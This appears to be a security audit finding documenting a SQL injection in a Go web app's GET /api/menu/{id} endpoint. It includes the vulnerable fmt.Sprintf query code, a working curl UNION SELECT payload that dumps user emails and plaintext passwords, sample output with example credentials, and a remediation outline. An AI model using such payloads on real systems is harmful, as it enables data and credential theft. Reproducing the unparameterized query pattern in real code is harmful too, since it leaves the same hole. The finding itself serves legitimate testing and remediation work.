# C1 — SQL Injection in `GET /api/menu/{id}` (V01)

**Severity:** Critical  
**CWE:** CWE-89 | **OWASP:** A03:2021  
**Status:** Confirmed (cold-verified)  
**Source draft:** `piolium/findings-draft/p7-001-v01-sqli-menu-item.md`

## Summary

The `id` path parameter in `GET /api/menu/{id}` is concatenated into a SQL `SELECT` via `fmt.Sprintf` and executed without parameterization. An unauthenticated attacker can read any table in the SQLite database (including `users.password` plaintext) using a UNION SELECT payload.

## Vulnerable Code

`handlers/menu.go::GetMenuItem` (line ~50):

```go
id := mux.Vars(r)["id"]
query := fmt.Sprintf("SELECT id, name, description, price, category, image_url, available FROM menu_items WHERE id=%s", id)
row := db.DB.QueryRow(query)
```

## Impact

- Full read access to the SQLite database (users, orders, reviews, inventory, request logs).
- Plaintext password exposure for all users (chains with F-A1).
- Endpoint is unauthenticated and on the public backend listener (`:4443`).

## PoC

```bash
# Extract every user's email + plaintext password via UNION SELECT
curl "http://localhost:4443/api/menu/0%20UNION%20SELECT%201,username,email,password,role,image_url,1%20FROM%20users--"
```

Expected response (HTTP 200):
```json
[
  {"id":1,"name":"admin","description":"admin@thelocalplate.com","price":0,"category":"Admin@2024!","image_url":"/static/assets/img/pizza.jpg","available":1},
  {"id":2,"name":"alice","description":"alice@example.com","price":0,"category":"Password123","image_url":"...","available":1},
  ...
]
```

## Variant

The same `fmt.Sprintf` pattern appears in `GetMenu` `?category=` filter — same root cause, same CWE, different sink call.

## Remediation Outline (no fix applied per scope)

Use `?` placeholders and `QueryRow(id)`, or validate `id` as integer via `strconv.Atoi` before query construction.

## Cold Verification Notes

Re-read source from fresh context: confirmed `fmt.Sprintf` with single `%s` placeholder for the `id` value, passed unsanitized to `db.DB.QueryRow`. The vulnerable function is reachable on the public backend listener with no authentication. No pre-existing sanitization found.
